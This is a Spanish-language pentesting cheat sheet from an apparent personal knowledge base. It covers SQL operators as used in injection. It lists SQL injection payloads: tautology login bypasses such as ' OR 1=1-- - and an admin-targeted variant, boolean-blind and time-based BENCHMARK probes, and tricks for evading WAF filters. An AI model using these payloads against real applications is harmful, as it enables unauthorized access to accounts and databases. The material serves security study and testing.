---
aliases:
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: CheatSheet
linked:
  - "[[SQL Commands]]"
---
# SQL - Operadores y Lógica

---

## Cheatsheet

| **Operador / Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `' OR 1=1-- -` | Tautología — todas las filas matchean | Auth bypass clásico. |
| `' OR 'a'='a'-- -` | Tautología sin números (bypass WAF numeric blacklist) | WAF filtra dígitos. |
| `' AND 1=2-- -` | Contradiction — siempre false | Validar blind FALSE response. |
| `' AND 1=1-- -` | Tautología — siempre true | Validar blind TRUE response. |
| `WHERE x = 1 OR 1=1` | Combina con filtro original | Standard inyección. |
| `WHERE x = 1 AND (SELECT ...) = 'val'` | Inferencia con subquery | Boolean blind. |
| `' OR username = 'admin'-- -` | Match exacto del admin | Auth bypass dirigido. |
| `' OR username LIKE '%adm%'-- -` | Match parcial con wildcard | Enum users sin nombre exacto. |
| `' OR id IN (1,2,3)-- -` | Match múltiples IDs en una expr | Bulk extraction. |
| `WHERE id BETWEEN 1 AND 100` | Rango inclusive | Enum secuencial. |
| `\|\|` (Oracle/PostgreSQL/ANSI) | String concat | Construir payload con `password\|\|':'\|\|user`. |
| `CONCAT(a,b,c)` (MySQL/MSSQL) | String concat | Mismo, sintaxis MySQL. |
| `+` (MSSQL) | String concat | Solo MSSQL. |
| `*`, `/`, `+`, `-`, `%` | Operadores aritméticos | Time-based via `BENCHMARK(1000000, MD5(rand()))`. |
| `&`, `\|`, `^`, `~`, `<<`, `>>` | Bit operations | Field con flags bitmask. |
^sql-logica

### Operadores de comparación

| Operador | Significado | Uso típico |
|:---:|:---:|:---:|
| `=` | Equal | `WHERE id = 1` |
| `<>` o `!=` | Not equal | `WHERE status <> 'deleted'` |
| `>`, `<`, `>=`, `<=` | Comparación numérica/lexicográfica | `WHERE ASCII(c) > 50` (binary search blind) |
| `LIKE` | Wildcard match (`%`, `_`) | `WHERE name LIKE 'adm%'` |
| `ILIKE` (PostgreSQL) | LIKE case-insensitive | Alt LIKE PG. |
| `IN (...)` | Match contra lista | `WHERE id IN (SELECT id FROM admins)` |
| `BETWEEN x AND y` | Rango inclusive | `WHERE age BETWEEN 18 AND 65` |
| `IS NULL` / `IS NOT NULL` | Check NULL | `WHERE password IS NULL` (creds vacías). |

---

## Overview

Operadores forman el "código" de las inyecciones. Tautologías (`OR 1=1`) y contradicciones (`AND 1=2`) son base de auth bypass y boolean blind. Aritmética + funciones (`BENCHMARK`) se combinan para time-based. Bit ops sirven en sistemas con permisos en bitmask.

WAF bypass: si dígitos filtrados → `'a'='a'`. Si `=` filtrado → `LIKE`. Si `AND`/`OR` filtrados → `&&`/`||` (MySQL).

---
